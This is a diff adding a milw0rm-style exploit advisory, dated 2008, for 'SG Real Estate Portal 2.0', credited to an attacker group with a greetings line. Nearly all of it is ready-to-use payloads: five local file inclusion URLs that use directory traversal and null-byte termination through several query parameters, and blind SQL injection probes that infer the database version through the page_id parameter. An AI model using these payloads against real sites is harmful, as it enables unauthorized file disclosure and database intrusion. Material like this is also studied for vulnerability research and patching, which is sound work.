@@ -1,0 +1,98 @@
+#################################################################################################################
+[+] SG Real Estate Portal 2.0 Blind SQL Injection/Local File Inclusion
+[+] Discovered By SirGod
+[+] MorTal TeaM
+[+] Greetz : E.M.I.N.E.M,Ras,Puscas_marin,ToxicBlood,HrN,kemrayz,007m,Raven,Nytr0gen,str0ke
+#################################################################################################################
+
+script: http://serverfree.org/download.php?file=347076
+
+[+] Local File Inclusion
+
+   - Note : For PoC's 4,5 you need administrative permissions.
+            Don't forget to put / before the local file in poc 2,3 .
+
+-----------------------------------------------------------------------------------------------------------------
+
+   Example 1 :
+
+     http://[target]/[path]/index.php?mod=[Local File]%00
+
+   PoC 1 :
+
+     http://127.0.0.1/path/index.php?mod=../../../../autoexec.bat%00
+
+-----------------------------------------------------------------------------------------------------------------
+
+   Example 2 :
+
+     http://[target]/[path]/index.php?page=/[Local File]%00
+
+
+   PoC 2 :
+
+     http://127.0.0.1/path/index.php?page=/../../../../autoexec.bat%00
+
+-----------------------------------------------------------------------------------------------------------------
+
+   Example 3 :
+
+
+     http://[target]/[path]/index.php?lang=/[Local File]%00&page_id=106
+
+   PoC 3 :
+
+     http://127.0.0.1/path/index.php?lang=/../../../../autoexec.bat%00&page_id=106
+
+-----------------------------------------------------------------------------------------------------------------
+
+   Example 4 :
+
+
+     http://[target]/[path]/admin/index.php?category=security&action=[Local
+File]%00
+
+   PoC 4 :
+
+     http://127.0.0.1/path/admin/index.php?category=security&action=../../../../../autoexec.bat%00
+
+-----------------------------------------------------------------------------------------------------------------
+
+   Example 5 :
+
+
+     http://[target]/[path]/admin/index.php?category=security&folder=[Local
+File]%00&page=params&id=8
+
+  PoC 5 :
+
+     http://127.0.0.1/path/admin/index.php?category=security&folder=../../../../../autoexec.bat%00&page=params&id=8
+
+-----------------------------------------------------------------------------------------------------------------
+
+ [+] Blind SQL Injection
+
+
+  Example :
+
+
+     http://127.0.0.1/path/index.php?lang=EN&page_id=106 and 1=1
+
+     http://127.0.0.1/path/index.php?lang=EN&page_id=106 and 1=2
+
+-----------------------------------------------------------------------------------------------------------------
+
+  PoC :
+
+
+     http://127.0.0.1/path/index.php?lang=EN&page_id=106 and
+substring(@@version,1,1)=5
+
+     http://127.0.0.1/path/index.php?lang=EN&page_id=106 and
+substring(@@version,1,1)=4
+
+-----------------------------------------------------------------------------------------------------------------
+
+#################################################################################################################
+
+# milw0rm.com [2008-09-30]
